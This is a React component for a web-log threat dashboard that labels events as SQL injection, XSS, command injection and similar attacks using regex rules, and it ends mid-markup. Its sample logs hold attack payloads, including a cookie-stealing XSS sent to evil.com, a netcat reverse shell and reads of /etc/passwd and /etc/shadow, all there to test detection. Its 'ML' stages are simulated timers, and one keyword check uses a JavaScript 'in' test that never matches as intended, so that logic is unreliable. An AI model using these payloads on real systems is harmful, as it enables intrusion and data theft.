import { useState, useEffect, useRef, useMemo } from 'react'
import { useApp } from '../../context/AppContext'
import { STAGE_COLORS, STAGE_OUTPUTS } from '../../data/chartConfigs'
import {
  GitBranch, Activity, Shield, Play, CheckCircle2, AlertTriangle,
  UploadCloud, FileText, Search, Download, RefreshCw, Terminal,
  ArrowRight, Database, Lock, AlertCircle, Sparkles, Filter, ChevronDown
} from 'lucide-react'
import { parseLogFile } from '../../utils/logParser'
import { analyzeLog } from '../../utils/logAnalyzer'

// Preset sample log streams for instant pipeline detection testing
const SAMPLE_PRESETS = {
  'cj.log': {
    name: 'Default Log (cj.log)',
    path: 'cj.log',
    content: `["id", "1' OR '1'='1", "2023-01-08 08:10:56", "104.28.209.153", "51234", "sqlmap/1.6.12#stable", "en-US", "10.0.0.1"]
["ls", "ps", "2023-01-08 08:11:49", "217.64.151.32", "44122", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "en-US", "10.0.0.1"]
[null, null, "2023-01-08 08:12:53", "78.46.46.240", "38910", "Go-http-client/1.1", "missing", "10.0.0.1"]
["url", "http://zeofee.com/wp/", "2023-01-08 15:32:21", "68.183.228.234", "59801", "Mozilla/5.0 (Windows NT 10.0; Win64)", "en-US", "10.0.0.1"]
["cmd", ";cat /etc/passwd", "2023-01-08 16:22:10", "185.220.101.5", "61022", "curl/7.68.0", "missing", "10.0.0.1"]
["search", "<script>alert('pwned')</script>", "2023-01-08 16:45:00", "203.0.113.88", "49152", "Mozilla/5.0 Firefox/110.0", "en", "10.0.0.1"]
["file", "../../../../../boot.ini", "2023-01-09 16:57:01", "42.106.39.186", "38910", "Mozilla/5.00 (Nikto/2.1.6)", "missing", "10.0.0.1"]
[null, null, "2023-01-09 16:49:12", "42.106.39.186", "38911", "Mozilla/5.0 (Windows NT 10.0; Win64)", "en-US", "10.0.0.1"]
[null, null, "2023-01-09 16:52:09", "42.106.39.186", "38912", "Mozilla/5.0 (X11; Linux x86_64)", "en-US", "10.0.0.1"]
["q", "shoes for running", "2023-01-10 10:15:30", "192.168.1.50", "51234", "Mozilla/5.0 Chrome/110.0", "en-US", "10.0.0.1"]`
  },
  'multi_attack': {
    name: 'OWASP Multi-Attack Injection Stream',
    path: 'data/attacks_stream.log',
    content: `["username", "admin' UNION SELECT 1, @@version, user() --", "2023-01-11 11:00:00", "45.33.32.156", "54321", "sqlmap/1.7#dev", "en", "10.0.0.1"]
["payload", "<svg/onload=fetch('//evil.com/?c='+document.cookie)>", "2023-01-11 11:01:15", "198.51.100.44", "54322", "Mozilla/5.0", "en-US", "10.0.0.1"]
["cmd", ";nc -e /bin/sh 10.0.0.99 4444", "2023-01-11 11:02:40", "185.220.101.5", "54323", "curl/7.81.0", "missing", "10.0.0.1"]
["path", "/app/download?file=../../../../../../etc/shadow", "2023-01-11 11:03:10", "103.24.88.19", "54324", "python-requests/2.28", "missing", "10.0.0.1"]
["include", "http://attacker.com/rfi_shell.txt", "2023-01-11 11:04:22", "178.128.62.143", "54325", "Mozilla/5.0", "missing", "10.0.0.1"]
[null, null, "2023-01-11 11:05:00", "192.168.1.10", "54326", "Mozilla/5.0 Chrome/114.0", "en-US", "10.0.0.1"]`
  },
  'scanner_recon': {
    name: 'Recon Scanners & Automated Bots',
    path: 'logs/scanners.log',
    content: `[null, null, "2023-01-12 04:00:01", "198.51.100.22", "38910", "DirBuster-1.0-RC1", "missing", "10.0.0.1"]
[null, null, "2023-01-12 04:00:02", "198.51.100.22", "38911", "gobuster/3.1.0", "missing", "10.0.0.1"]
[null, null, "2023-01-12 04:00:03", "42.105.165.217", "38912", "Mozilla/5.0 (Nikto/2.1.6)", "missing", "10.0.0.1"]
[null, null, "2023-01-12 04:00:04", "42.105.165.217", "38913", "Nmap Scripting Engine; https://nmap.org/book/nse.html", "missing", "10.0.0.1"]
[null, null, "2023-01-12 04:00:05", "185.191.171.1", "38914", "masscan/1.3.2", "missing", "10.0.0.1"]
[null, null, "2023-01-12 04:00:10", "192.168.1.25", "51234", "Mozilla/5.0 Safari/537.36", "en-US", "10.0.0.1"]`
  }
}

// Attack classification rules matching our Python pipeline
function classifyEvent(ev) {
  const k = String(ev.fields?.param_key || ev.fields?.key || '').toLowerCase()
  const v = String(ev.fields?.param_value || ev.fields?.value || ev.message || ev.raw_line || '').toLowerCase()
  const ua = String(ev.fields?.user_agent || ev.fields?.ua || '').toLowerCase()

  if (k in ['ls', 'ps', 'cat', 'id', 'whoami', 'reboot'] || /rm\s+-rf|wget|curl|;\s*cat|;\s*ls|passthru|shell_exec|\/bin\/sh|\/bin\/bash/.test(v) || /rm\s+-rf|wget|;\s*cat/.test(k)) {
    return { category: 'cmd_injection', label: 'Command Injection', severity: 'CRITICAL', color: '#ef4444' }
  }
  if (/\.\.\/|\.\.\\|\/etc\/passwd|win\.ini|boot\.ini|windows\/system32|%2e%2e/i.test(v) || /\.\.\/|\.\.\\/i.test(k)) {
    return { category: 'path_traversal', label: 'Path Traversal', severity: 'HIGH', color: '#f97316' }
  }
  if (/'|--|union\s+select|select\s+.*from|sleep\(|benchmark\(|order\s+by|\b1=1\b|or\s+true/i.test(v) || /union\s+select|sleep\(/i.test(k)) {
    return { category: 'sqli', label: 'SQL Injection', severity: 'CRITICAL', color: '#dc2626' }
  }
  if (/<script|alert\(|javascript:|onerror=|onload=|<img\s+src=/i.test(v)) {
    return { category: 'xss', label: 'Cross-Site Scripting (XSS)', severity: 'HIGH', color: '#eab308' }
  }
  if (/https?:\/\/|ftp:\/\/|rfiinc\.txt|php:\/\/input/i.test(v)) {
    return { category: 'rfi', label: 'Remote File Inclusion (RFI)', severity: 'HIGH', color: '#a855f7' }
  }
  if (/nikto|dirbuster|gobuster|sqlmap|nmap|zgrab|masscan|wpscan|python-requests|go-http-client|curl\/|censys|hydra/i.test(ua)) {
    return { category: 'scanner_recon', label: 'Automated Scanner / Recon', severity: 'MEDIUM', color: '#38bdf8' }
  }
  return { category: 'benign', label: 'Benign Traffic', severity: 'OK', color: '#34d399' }
}

export default function PipelineView() {
  const { openPractical } = useApp()
  const [data, setData] = useState([])
  const fileInputRef = useRef(null)

  // Interactive Pipeline Runner State
  const [logPath, setLogPath] = useState('cj.log')
  const [customLogText, setCustomLogText] = useState(SAMPLE_PRESETS['cj.log'].content)
  const [isRunning, setIsRunning] = useState(false)
  const [activeStep, setActiveStep] = useState(0)
  const [filterCategory, setFilterCategory] = useState('ALL')
  const [searchQuery, setSearchQuery] = useState('')
  const [pipelineResult, setPipelineResult] = useState(null)

  useEffect(() => {
    fetch('../web_data.json')
      .then(r => r.json())
      .then(setData)
      .catch(() => {})
  }, [])

  // Execute the pipeline on the input log data
  const runPipeline = (rawContent = customLogText, pathName = logPath) => {
    setIsRunning(true)
    setActiveStep(1)

    // Simulate real-time stage progress
    setTimeout(() => setActiveStep(2), 250)
    setTimeout(() => setActiveStep(3), 500)
    setTimeout(() => setActiveStep(4), 750)
    setTimeout(() => setActiveStep(5), 1000)

    setTimeout(() => {
      try {
        const parseResult = parseLogFile(rawContent, pathName)
        const analysis = analyzeLog(parseResult)

        // Process individual events through our attack detection classifier
        const events = parseResult.events || []
        const classifiedEvents = events.map(ev => {
          const classification = classifyEvent(ev)
          return {
            id: ev.line_num || Math.random().toString(36).substring(7),
            timestamp: ev.timestamp ? ev.timestamp.toISOString().replace('T', ' ').substring(0, 19) : '2023-01-15 10:00:00',
            ip: ev.fields?.client_ip || ev.fields?.ip || ev.ip || '192.168.1.1',
            paramKey: ev.fields?.param_key || ev.fields?.key || 'none',
            paramVal: ev.fields?.param_value || ev.fields?.value || ev.message || ev.raw_line || 'none',
            userAgent: ev.fields?.user_agent || ev.fields?.ua || 'unknown',
            ...classification
          }
        })

        // Build prediction breakdown table
        const categoryCounts = {}
        classifiedEvents.forEach(e => {
          categoryCounts[e.category] = (categoryCounts[e.category] || 0) + 1
        })

        const totalCount = classifiedEvents.length || 1
        const summaryTable = Object.entries(categoryCounts).map(([cat, count]) => ({
          category: cat,
          label: cat === 'benign' ? 'benign' : cat,
          count,
          share: ((count / totalCount) * 100).toFixed(2)
        })).sort((a, b) => b.count - a.count)

        // Extract top attacker IPs
        const ipAttacks = {}
        classifiedEvents.filter(e => e.category !== 'benign').forEach(e => {
          if (!ipAttacks[e.ip]) {
            ipAttacks[e.ip] = { ip: e.ip, count: 0, categories: {} }
          }
          ipAttacks[e.ip].count++
          ipAttacks[e.ip].categories[e.category] = (ipAttacks[e.ip].categories[e.category] || 0) + 1
        })

        const topIps = Object.values(ipAttacks)
          .sort((a, b) => b.count - a.count)
          .slice(0, 5)
          .map(item => {
            const topCat = Object.entries(item.categories).sort((a, b) => b[1] - a[1])[0]?.[0] || 'unknown'
            return {
              ip: item.ip,
              totalAttacks: item.count,
              primaryThreat: topCat,
              riskLevel: item.count > 5 ? 'CRITICAL' : item.count > 2 ? 'HIGH' : 'MEDIUM'
            }
          })

        const threatsCount = classifiedEvents.filter(e => e.category !== 'benign').length

        setPipelineResult({
          path: pathName,
          totalParsed: parseResult.parsing?.total_lines || events.length,
          cleanRecords: classifiedEvents.length,
          duplicatesRemoved: Math.max(0, (parseResult.parsing?.total_lines || events.length) - classifiedEvents.length),
          threatsCount,
          threatRatio: ((threatsCount / totalCount) * 100).toFixed(2),
          summaryTable,
          topIps,
          classifiedEvents,
          analysis
        })
      } catch (err) {
        console.error("Pipeline run error:", err)
      } finally {
        setIsRunning(false)
        setActiveStep(6)
      }
    }, 1200)
  }

  // Handle preset loading
  const loadPreset = (key) => {
    const preset = SAMPLE_PRESETS[key]
    if (!preset) return
    setLogPath(preset.path)
    setCustomLogText(preset.content)
    runPipeline(preset.content, preset.path)
  }

  // Handle file upload
  const handleFileUpload = (e) => {
    const file = e.target.files?.[0]
    if (!file) return
    const reader = new FileReader()
    reader.onload = (evt) => {
      const content = evt.target?.result || ''
      setLogPath(file.name)
      setCustomLogText(content)
      runPipeline(content, file.name)
    }
    reader.readAsText(file)
  }

  // Initial auto-run on mount
  useEffect(() => {
    runPipeline(SAMPLE_PRESETS['cj.log'].content, 'cj.log')
  }, [])

  // Filtered threat events for the detailed evidence table
  const displayedEvents = useMemo(() => {
    if (!pipelineResult) return []
    return pipelineResult.classifiedEvents.filter(e => {
      const matchCat = filterCategory === 'ALL' || 
        (filterCategory === 'ATTACKS_ONLY' ? e.category !== 'benign' : e.category === filterCategory)
      const matchQuery = !searchQuery || 
        e.ip.toLowerCase().includes(searchQuery.toLowerCase()) ||
        e.paramVal.toLowerCase().includes(searchQuery.toLowerCase()) ||
        e.paramKey.toLowerCase().includes(searchQuery.toLowerCase()) ||
        e.userAgent.toLowerCase().includes(searchQuery.toLowerCase())
      return matchCat && matchQuery
    })
  }, [pipelineResult, filterCategory, searchQuery])

  // Download CSV export artifact
  const downloadCsv = () => {
    if (!pipelineResult) return
    const headers = ['datetime', 'client_ip', 'attack_category', 'param_key', 'param_value', 'user_agent', 'severity']
    const rows = pipelineResult.classifiedEvents.map(e => [
      e.timestamp, e.ip, e.category, e.paramKey, `"${e.paramVal.replace(/"/g, '""')}"`, `"${e.userAgent.replace(/"/g, '""')}"`, e.severity
    ])
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(r => r.join(','))].join('\n')
    const encodedUri = encodeURI(csvContent)
    const link = document.createElement('a')
    link.setAttribute('href', encodedUri)
    link.setAttribute('download', 'pipeline_processed_dataset.csv')
    document.body.appendChild(link)
    link.click()
    document.body.removeChild(link)
  }

  return (
    <section className="view">
      <div className="hero-cover cover-pipeline">
        <div className="cover-content">
          <div className="hero-badge">End-to-End Data Science Workflow</div>
          <h1 className="hero-title">Pipeline Flow & Live Threat Ingestion</h1>
          <p className="hero-sub">Ingest arbitrary log files, execute end-to-end ML feature pipelines, and inspect forensic threat classifications.</p>
        </div>
      </div>

      <div className="page-body">
        {/* ── INTERACTIVE PIPELINE RUNNER ── */}
        <div style={{
          background: 'var(--bg-card, #131722)',
          border: '1px solid var(--border-medium, #2d3748)',
          borderRadius: '16px',
          padding: '24px',
          marginBottom: '32px',
          boxShadow: '0 8px 32px rgba(0,0,0,0.3)'
        }}>
          {/* Header */}
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '14px', marginBottom: '18px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <div style={{
                width: '42px', height: '42px', borderRadius: '10px',
                background: 'linear-gradient(135deg, rgba(0,210,255,0.2), rgba(129,140,248,0.2))',
                border: '1px solid rgba(0,210,255,0.3)',
                display: 'flex', alignItems: 'center', justifyContent: 'center'
              }}>
                <Terminal size={22} style={{ color: '#38bdf8' }} />
              </div>
              <div>
                <h2 style={{ fontSize: '18px', fontWeight: '800', margin: 0, color: 'var(--text-primary, #f8fafc)' }}>
                  Interactive Pipeline Runner & Threat Classifier
                </h2>
                <p style={{ fontSize: '13px', color: 'var(--text-muted, #94a3b8)', margin: '2px 0 0' }}>
                  Provide any log file path or choose a preset stream to execute the 10-stage detection pipeline.
                </p>
              </div>
            </div>

            {/* Quick Actions */}
            <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
              <input
                type="file"
                ref={fileInputRef}
                style={{ display: 'none' }}
                accept=".log,.txt,.json,.csv,.tsv"
                onChange={handleFileUpload}
              />
              <button
                className="btn btn-secondary"
                onClick={() => fileInputRef.current?.click()}
                style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '12.5px', padding: '8px 14px' }}
              >
                <UploadCloud size={15} /> Upload Custom Log
              </button>
              <button
                className="btn btn-primary"
                onClick={() => runPipeline(customLogText, logPath)}
                disabled={isRunning}
                style={{
                  display: 'flex', alignItems: 'center', gap: '6px',
                  fontSize: '12.5px', padding: '8px 18px',
                  background: 'linear-gradient(135deg, #0284c7, #6366f1)',
                  color: '#fff', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: 'pointer'
                }}
              >
                {isRunning ? <RefreshCw size={15} className="spin" /> : <Play size={15} fill="currentColor" />}
                {isRunning ? 'Executing Pipeline...' : 'Run Pipeline on Log'}
              </button>
            </div>
          </div>

          {/* Log File Path Input Bar */}
          <div style={{ display: 'flex', gap: '10px', alignItems: 'center', marginBottom: '16px' }}>
            <div style={{
              flex: 1, display: 'flex', alignItems: 'center', gap: '10px',
              background: 'rgba(15, 23, 42, 0.6)', border: '1px solid var(--border-medium, #334155)',
              borderRadius: '8px', padding: '10px 14px'
            }}>
              <span style={{ fontSize: '12px', fontWeight: '700', color: 'var(--accent-cyan, #38bdf8)', fontFamily: 'monospace' }}>
                LOG_INPUT_PATH:
              </span>
              <input
                type="text"
                value={logPath}
                onChange={(e) => setLogPath(e.target.value)}
                placeholder="e.g. cj.log, data/sample.csv, or /var/log/nginx/access.log"
                style={{
                  flex: 1, background: 'transparent', border: 'none', outline: 'none',
                  color: '#f8fafc', fontSize: '13px', fontFamily: 'monospace'
                }}
              />
            </div>
          </div>

          {/* Preset Buttons */}
          <div style={{ display: 'flex', gap: '8px', alignItems: 'center', flexWrap: 'wrap', marginBottom: '20px' }}>
            <span style={{ fontSize: '12px', color: 'var(--text-muted, #94a3b8)', fontWeight: '600' }}>Sample Presets:</span>
            {Object.entries(SAMPLE_PRESETS).map(([key, val]) => (
              <button
                key={key}
                onClick={() => loadPreset(key)}
                style={{
                  background: logPath === val.path ? 'rgba(56, 189, 248, 0.15)' : 'rgba(255,255,255,0.04)',
                  border: logPath === val.path ? '1px solid #38bdf8' : '1px solid rgba(255,255,255,0.1)',
                  color: logPath === val.path ? '#38bdf8' : 'var(--text-secondary, #cbd5e1)',
                  padding: '5px 11px', borderRadius: '6px', fontSize: '12px', cursor: 'pointer', transition: 'all 0.15s'
                }}
              >
                {val.name}
              </button>
            ))}
          </div>

          {/* 6-Stage Visual Stepper */}
          <div style={{
            display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(130px, 1fr))', gap: '8px',
            background: 'rgba(0,0,0,0.2)', padding: '14px', borderRadius: '10px', marginBottom: '22px'
          }}>
            {[
              { stage: 1, title: 'Ingest & Parse', desc: 'JSON/CSV/Log' },
              { stage: 2, title: 'Clean & Dedup', desc: 'Normalized fields' },
              { stage: 3, title: 'Attack Labeling', desc: 'OWASP Taxonomy' },
              { stage: 4, title: 'Feature Eng.', desc: 'Entropy & Velocity' },
              { stage: 5, title: 'Artifact Export', desc: 'CSV & Parquet' },
              { stage: 6, title: 'ML Inference', desc: 'Threat Predictions' },
            ].map(s => {
              const done = activeStep >= s.stage
              const active = activeStep === s.stage
              return (
                <div key={s.stage} style={{
                  padding: '10px', borderRadius: '8px',
                  background: active ? 'rgba(56,189,248,0.1)' : (done ? 'rgba(52,211,153,0.06)' : 'rgba(255,255,255,0.02)'),
                  border: active ? '1px solid #38bdf8' : (done ? '1px solid rgba(52,211,153,0.3)' : '1px solid rgba(255,255,255,0.05)'),
                  transition: 'all 0.2s'
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginBottom: '4px' }}>
                    <div style={{
                      width: '18px', height: '18px', borderRadius: '50%',
                      background: done ? '#10b981' : (active ? '#0284c7' : '#334155'),
                      color: '#fff', fontSize: '10px', fontWeight: '800',
                      display: 'flex', alignItems: 'center', justifyContent: 'center'
                    }}>
                      {done ? '✓' : s.stage}
                    </div>
                    <span style={{ fontSize: '11.5px', fontWeight: '700', color: done ? '#34d399' : (active ? '#38bdf8' : '#94a3b8') }}>
                      Stage {s.stage}
                    </span>
                  </div>
                  <div style={{ fontSize: '12px', fontWeight: '600', color: '#f8fafc' }}>{s.title}</div>
                  <div style={{ fontSize: '10.5px', color: '#64748b' }}>{s.desc}</div>
                </div>
              )
            })}
          </div>

          {/* Pipeline Results Section */}
          {pipelineResult && (
            <div style={{ marginTop: '10px' }}>
              {/* KPI Summary Grid */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '12px', marginBottom: '22px' }}>
                <div style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid var(--border-subtle, #334155)', borderRadius: '10px', padding: '14px' }}>
                  <div style={{ fontSize: '11px', color: '#94a3b8', fontWeight: '600', textTransform: 'uppercase' }}>Parsed Records</div>
                  <div style={{ fontSize: '22px', fontWeight: '800', color: '#38bdf8', marginTop: '4px' }}>
                    {pipelineResult.totalParsed.toLocaleString()}
                  </div>
                  <div style={{ fontSize: '11px', color: '#64748b', marginTop: '2px' }}>Ingested from {pipelineResult.path}</div>
                </div>

                <div style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid var(--border-subtle, #334155)', borderRadius: '10px', padding: '14px' }}>
                  <div style={{ fontSize: '11px', color: '#94a3b8', fontWeight: '600', textTransform: 'uppercase' }}>Clean Unique Records</div>
                  <div style={{ fontSize: '22px', fontWeight: '800', color: '#34d399', marginTop: '4px' }}>
                    {pipelineResult.cleanRecords.toLocaleString()}
                  </div>
                  <div style={{ fontSize: '11px', color: '#64748b', marginTop: '2px' }}>Removed {pipelineResult.duplicatesRemoved.toLocaleString()} duplicates</div>
                </div>

                <div style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid var(--border-subtle, #334155)', borderRadius: '10px', padding: '14px' }}>
                  <div style={{ fontSize: '11px', color: '#94a3b8', fontWeight: '600', textTransform: 'uppercase' }}>Threats Detected</div>
                  <div style={{ fontSize: '22px', fontWeight: '800', color: pipelineResult.threatsCount > 0 ? '#ef4444' : '#34d399', marginTop: '4px' }}>
                    {pipelineResult.threatsCount.toLocaleString()}
                  </div>
                  <div style={{ fontSize: '11px', color: '#64748b', marginTop: '2px' }}>Threat Ratio: {pipelineResult.threatRatio}%</div>
                </div>

                <div style={{ background: 'rgba(255,255,255,0.02)', border: '1px solid var(--border-subtle, #334155)', borderRadius: '10px', padding: '14px' }}>
                  <div style={{ fontSize: '11px', color: '#94a3b8', fontWeight: '600', textTransform: 'uppercase' }}>Artifacts Generated</div>
                  <div style={{ fontSize: '14px', fontWeight: '700', color: '#a78bfa', marginTop: '8px' }}>
                    CSV & Parquet Ready
                  </div>
                  <div style={{ display: 'flex', gap: '8px', marginTop: '6px' }}>
                    <button
                      onClick={downloadCsv}
                      style={{
                        background: 'rgba(167, 139, 250, 0.15)', border: '1px solid rgba(167, 139, 250, 0.3)',
                        color: '#c4b5fd', borderRadius: '5px', padding: '4px 8px', fontSize: '11px', cursor: 'pointer',
                        display: 'flex', alignItems: 'center', gap: '4px'
                      }}
                    >
                      <Download size={12} /> Download CSV
                    </button>
                  </div>
                </div>
              </div>

              {/* ── AUTOMATED ML PREDICTION SUMMARY TABLE (Matches CLI Terminal Table) ── */}
              <div style={{ marginBottom: '26px' }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <Activity size={17} style={{ color: '#38bdf8' }} />
                    <h3 style={{ fontSize: '14px', fontWeight: '800', margin: 0, letterSpacing: '0.02em', textTransform: 'uppercase', color: '#e2e8f0' }}>
                      Pipeline Automated ML Prediction Summary
                    </h3>
                  </div>
                  <span style={{ fontSize: '11.5px', color: '#64748b', fontFamily: 'monospace' }}>
                    Total Events: {pipelineResult.cleanRecords}
                  </span>
                </div>

                <div style={{
                  background: 'rgba(15, 23, 42, 0.7)', border: '1px solid rgba(255,255,255,0.08)',
                  borderRadius: '10px', overflow: 'hidden'
                }}>
                  <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12.5px', textAlign: 'left' }}>
                    <thead>
                      <tr style={{ background: 'rgba(255,255,255,0.03)', borderBottom: '1px solid rgba(255,255,255,0.08)', color: '#94a3b8' }}>
                        <th style={{ padding: '10px 14px', width: '40px' }}>#</th>
                        <th style={{ padding: '10px 14px' }}>Predicted Class</th>
                        <th style={{ padding: '10px 14px', textAlign: 'right' }}>Record Count</th>
                        <th style={{ padding: '10px 14px', textAlign: 'right', width: '120px' }}>Share (%)</th>
                        <th style={{ padding: '10px 14px', width: '160px' }}>Distribution</th>
                      </tr>
                    </thead>
                    <tbody>
                      {pipelineResult.summaryTable.map((row, idx) => (
                        <tr key={row.category} style={{ borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
                          <td style={{ padding: '9px 14px', color: '#64748b', fontFamily: 'monospace' }}>{idx}</td>
                          <td style={{ padding: '9px 14px', fontWeight: '600' }}>
                            <span style={{
                              display: 'inline-block', width: '8px', height: '8px', borderRadius: '50%',
                              marginRight: '8px',
                              background: row.category === 'benign' ? '#34d399' : (row.category === 'sqli' ? '#dc2626' : (row.category === 'cmd_injection' ? '#ef4444' : '#f59e0b'))
                            }} />
                            <span style={{ fontFamily: 'monospace', color: row.category === 'benign' ? '#34d399' : '#f87171' }}>
                              {row.label}
                            </span>
                          </td>
                          <td style={{ padding: '9px 14px', textAlign: 'right', fontFamily: 'monospace', color: '#f8fafc' }}>
                            {row.count.toLocaleString()}
                          </td>
                          <td style={{ padding: '9px 14px', textAlign: 'right', fontFamily: 'monospace', fontWeight: '700', color: '#38bdf8' }}>
                            {row.share}%
                          </td>
                          <td style={{ padding: '9px 14px' }}>
                            <div style={{ width: '100%', height: '6px', background: 'rgba(255,255,255,0.06)', borderRadius: '3px', overflow: 'hidden' }}>
                              <div style={{
                                width: `${Math.min(100, Math.max(3, parseFloat(row.share)))}%`, height: '100%',
                                background: row.category === 'benign' ? '#34d399' : '#f43f5e',
                                borderRadius: '3px'
                              }} />
                            </div>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>

              {/* ── TOP ATTACKING IP ADDRESSES TABLE ── */}
              {pipelineResult.topIps.length > 0 && (
                <div style={{ marginBottom: '26px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '10px' }}>
                    <Shield size={17} style={{ color: '#f87171' }} />
                    <h3 style={{ fontSize: '14px', fontWeight: '800', margin: 0, letterSpacing: '0.02em', textTransform: 'uppercase', color: '#e2e8f0' }}>
                      Top Attacking IP Addresses & Risk Assessment
                    </h3>
                  </div>

                  <div style={{
                    background: 'rgba(15, 23, 42, 0.7)', border: '1px solid rgba(255,255,255,0.08)',
                    borderRadius: '10px', overflow: 'hidden'
                  }}>
                    <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12.5px', textAlign: 'left' }}>
                      <thead>
                        <tr style={{ background: 'rgba(255,255,255,0.03)', borderBottom: '1px solid rgba(255,255,255,0.08)', color: '#94a3b8' }}>
                          <th style={{ padding: '10px 14px', width: '40px' }}>#</th>
                          <th style={{ padding: '10px 14px' }}>Attacker IP</th>
                          <th style={{ padding: '10px 14px', textAlign: 'right' }}>Total Attacks</th>
                          <th style={{ padding: '10px 14px' }}>Primary Threat</th>
                          <th style={{ padding: '10px 14px' }}>Risk Level</th>
                        </tr>
                      </thead>
                      <tbody>
                        {pipelineResult.topIps.map((item, idx) => (
                          <tr key={item.ip} style={{ borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
                            <td style={{ padding: '9px 14px', color: '#64748b', fontFamily: 'monospace' }}>{idx}</td>
                            <td style={{ padding: '9px 14px', fontFamily: 'monospace', color: '#38bdf8', fontWeight: '600' }}>
                              {item.ip}
                            </td>
                            <td style={{ padding: '9px 14px', textAlign: 'right', fontFamily: 'monospace', color: '#f8fafc' }}>
                              {item.totalAttacks}
                            </td>
                            <td style={{ padding: '9px 14px', fontFamily: 'monospace', color: '#fca5a5' }}>
                              {item.primaryThreat}
                            </td>
                            <td style={{ padding: '9px 14px' }}>
                              <span style={{
                                padding: '3px 8px', borderRadius: '4px', fontSize: '10.5px', fontWeight: '800',
                                background: item.riskLevel === 'CRITICAL' ? 'rgba(220, 38, 38, 0.2)' : 'rgba(245, 158, 11, 0.2)',
                                border: item.riskLevel === 'CRITICAL' ? '1px solid #dc2626' : '1px solid #f59e0b',
                                color: item.riskLevel === 'CRITICAL' ? '#f87171' : '#fbbf24'
                              }}>
                                {item.riskLevel}
                              </span>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}

              {/* ── DETECTED THREAT EVIDENCE & ATTACK DETAILS ── */}
              <div>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '10px', marginBottom: '12px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <Search size={17} style={{ color: '#a78bfa' }} />
                    <h3 style={{ fontSize: '14px', fontWeight: '800', margin: 0, letterSpacing: '0.02em', textTransform: 'uppercase', color: '#e2e8f0' }}>
                      Detected Threat Evidence & Event Forensics
                    </h3>
                  </div>

                  <div style={{ display: 'flex', gap: '10px', alignItems: 'center', flexWrap: 'wrap' }}>
                    {/* Filter Category */}
                    <select
                      value={filterCategory}
                      onChange={(e) => setFilterCategory(e.target.value)}
                      style={{
                        background: 'rgba(15, 23, 42, 0.8)', border: '1px solid var(--border-medium, #334155)',
                        color: '#f8fafc', padding: '6px 10px', borderRadius: '6px', fontSize: '12px'
                      }}
                    >
                      <option value="ALL">All Events ({pipelineResult.cleanRecords})</option>
                      <option value="ATTACKS_ONLY">Attacks Only ({pipelineResult.threatsCount})</option>
                      <option value="sqli">SQL Injection</option>
                      <option value="cmd_injection">Command Injection</option>
                      <option value="xss">Cross-Site Scripting (XSS)</option>
                      <option value="path_traversal">Path Traversal</option>
                      <option value="scanner_recon">Scanner / Recon</option>
                      <option value="rfi">Remote File Inclusion (RFI)</option>
                      <option value="benign">Benign Traffic</option>
                    </select>

                    {/* Search Input */}
                    <div style={{
                      display: 'flex', alignItems: 'center', gap: '6px',
                      background: 'rgba(15, 23, 42, 0.8)', border: '1px solid var(--border-medium, #334155)',
                      borderRadius: '6px', padding: '6px 10px'
                    }}>
                      <Search size={13} style={{ color: '#64748b' }} />
                      <input
                        type="text"
                        placeholder="Search IP, payload, param..."
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        style={{
                          background: 'transparent', border: 'none', outline: 'none',
                          color: '#f8fafc', fontSize: '12px', width: '160px'
                        }}
                      />
                    </div>
                  </div>
                </div>

                <div style={{
                  background: 'rgba(15, 23, 42, 0.7)', border: '1px solid rgba(255,255,255,0.08)',
                  borderRadius: '10px', overflow: 'hidden'
                }}>
                  <div style={{ overflowX: 'auto' }}>
                    <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12px', textAlign: 'left', minWidth: '780px' }}>
                      <thead>
                        <tr style={{ background: 'rgba(255,255,255,0.03)', borderBottom: '1px solid rgba(255,255,255,0.08)', color: '#94a3b8' }}>
                          <th style={{ padding: '10px 12px', width: '140px' }}>Timestamp</th>
                          <th style={{ padding: '10px 12px', width: '130px' }}>Client IP</th>
                          <th style={{ padding: '10px 12px', width: '140px' }}>Attack Class</th>
                          <th style={{ padding: '10px 12px', width: '80px' }}>Param</th>
                          <th style={{ padding: '10px 12px' }}>Malicious Payload / Value</th>
                          <th style={{ padding: '10px 12px', width: '160px' }}>User Agent / Tool</th>
                        </tr>
                      </thead>
                      <tbody>
                        {displayedEvents.slice(0, 25).map((ev) => (
                          <tr key={ev.id} style={{ borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
                            <td style={{ padding: '8px 12px', color: '#64748b', fontFamily: 'monospace' }}>
                              {ev.timestamp}
                            </td>
                            <td style={{ padding: '8px 12px', fontFamily: 'monospace', color: '#38bdf8' }}>
                              {ev.ip}
                            </td>
                            <td style={{ padding: '8px 12px' }}>
                              <span style={{
                                padding: '2px 7px', borderRadius: '4px', fontSize: '10.5px', fontWeight: '700',
                                background: `${ev.color}18`, border: `1px solid ${ev.color}40`, color: ev.color,
                                fontFamily: 'monospace'
                              }}>
                                {ev.category}
                              </span>
